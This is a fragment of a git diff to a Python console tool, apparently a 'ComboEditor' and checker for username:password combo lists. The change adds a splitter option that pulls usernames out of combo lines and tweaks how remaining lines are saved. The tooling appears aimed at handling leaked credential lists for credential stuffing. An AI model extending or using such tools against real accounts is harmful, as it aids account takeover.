                             f'                                                      {Fore.MAGENTA}-------------------'
                         )
                     else:
@@ -2279,7 +2342,8 @@ class Main:
             10: self.combo,
             11: self.sort,
             12: self.filter,
-            13: self.domainchanger
+            13: self.domainchanger,
+            14: self.splitter
 
 
         }
@@ -2455,22 +2519,24 @@ class Main:
 
     def splitter(self):
         system('cls')
-        sep = input("Input delimiter (Default is ':')\n> ")
+        sep = input("Input delimiter (Default is '|')\n> ")
         if sep == '':
-            delimiter = ':'
+            delimiter = '|'
         else:
             delimiter = sep
-        usernames = f'User{self.unix}.txt'
-        pwd = f'Pass{self.unix}.txt'
-        u = open(usernames, 'w', encoding='latin-1')
-        p = open(pwd, 'w', encoding='latin-1')
+        done = []
         lines = self.lines.readlines()
-        for x in range(len(lines)):
-            user, pw = lines[x].split(delimiter)
-            u.write(f'{user}\n')
-            p.write(pw)
+        for line in lines:
+            user1 = line.split(delimiter)
+            user = user1[0].strip()
+            print(user)
+            done.append(user)
+        usernames = f'User{self.unix}.txt'
+        for line in done:
+            with open(usernames, 'a', encoding='utf-8') as f:
+                f.write(f'{line}\n')
         print(
-            f'{Fore.CYAN}\n[ComboEditor] Users saved in {usernames}\nPasswords saved in {pwd}\n')
+            f'{Fore.CYAN}\n[ComboEditor] Lines saved in {usernames}\n')
         input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
         system('cls')
         Main()
@@ -3002,7 +3068,6 @@ class Checker:
         if Counter.Checking: 
             Checker.save_lines()
     def save_lines():
-        os.system('cls')
         print(f"    [{Fore.CYAN}Saving Remaining Lines{Fore.RESET}]")
         unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
         with open(f"{unix} Remaining_lines.txt","w", encoding='utf8') as file: file.write("\n".join(Counter.remaining))
